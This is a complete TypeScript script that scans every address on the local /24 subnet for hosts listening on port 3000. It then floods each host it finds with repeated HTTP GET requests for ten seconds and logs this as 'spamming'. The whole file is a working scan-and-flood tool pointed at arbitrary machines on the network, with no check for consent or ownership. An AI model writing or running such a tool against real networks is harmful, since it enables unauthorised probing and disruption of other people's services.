import net from 'net';
import os from 'os';
import http from 'http';

const PORT = 3000;
const TIMEOUT = 200;
const PATH = '/';

const SPAM_DURATION = 10000;
let spam = true;

function getLocalSubnet() {
  const interfaces = os.networkInterfaces();

  for (const interfaceName in interfaces) {
    if (interfaces[interfaceName]) {
      for (const interfaceData of interfaces[interfaceName]) {
        if (interfaceData.family === 'IPv4' && !interfaceData.internal) {
          const ipParts = interfaceData.address.split('.');
          return ipParts.slice(0, 3).join('.') + '.';
        }
      }
    }
  }
  return null;
}

function checkPortOpen(ip: string, port: number, timeout: number): Promise<string | null> {
  return new Promise((resolve) => {
    const socket = new net.Socket();
    socket.setTimeout(timeout);

    socket.on('connect', () => {
      socket.destroy();
      resolve(ip);
    });

    socket.on('timeout', () => {
      socket.destroy();
      resolve(null);
    });
    
    socket.on('error', () => {
      socket.destroy();
      resolve(null);
    });

    socket.connect({ port: port, host: ip}); 
  });
}

function executeHttpRequest(host: string, port: number, path: string): Promise<void> {
  return new Promise<void>((resolve, reject) => {
    const options: http.RequestOptions = {
      host: host,
      port: port,
      path: path,
      method: 'GET',
      timeout: 300,
    };

    const req = http.request(options, (res) => {
      res.resume();
      resolve();
    });

    req.on('error', (err) => {
      reject(err);
    });

    req.end();
  });
}

function delay(ms: number): Promise<void> {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function scanNetwork(subnet: string): Promise<string[]> {
  const promises: Promise<string | null>[] = [];

  for (let i = 1; i < 255; i++) {
    const ip = `${subnet}${i}`;
    promises.push(checkPortOpen(ip, PORT, TIMEOUT));
  }

  const result = await Promise.all(promises);
  const activeHosts = result.filter(ip => ip != null);

  return activeHosts;
}

async function main(): Promise<void> {
  try {
    const subnet = getLocalSubnet();
    if (!subnet) {
      throw('Could not determinate local subnet!');
    }

    console.log(`Network scanning: ${subnet}0/24 on port ${PORT}`);
    const activeHosts = await scanNetwork(subnet);

    if (activeHosts.length === 0) {
      throw(`On this network there are not active hosts serving on port ${PORT}`)
    }

    console.log(`Found these active hosts serving on port ${PORT}:`);
    activeHosts.forEach(ip => console.log(`- ${ip}:${PORT}`));

    console.log('Start spamming to found hosts...');
    
    const spamTimeout = setTimeout(() => {
      spam = false;
      console.log('Stopped spamming');
    }, SPAM_DURATION);

    const aliveHosts = new Set(activeHosts);

    await Promise.all(
      activeHosts.map(async (host) => {
        while (spam && aliveHosts.has(host)) {
          try {
            console.log(`spamming to ${host}`);
            await executeHttpRequest(host, PORT, PATH);
            await delay(100);
            
          } catch (err) {
            console.error(err);
            aliveHosts.delete(host);
            if (aliveHosts.size === 0) {
              clearTimeout(spamTimeout);
              throw(`There are not any host active`);
            }
          }
        }
      })
    );

  } catch (err) {
    console.log(err);
  }
}

main();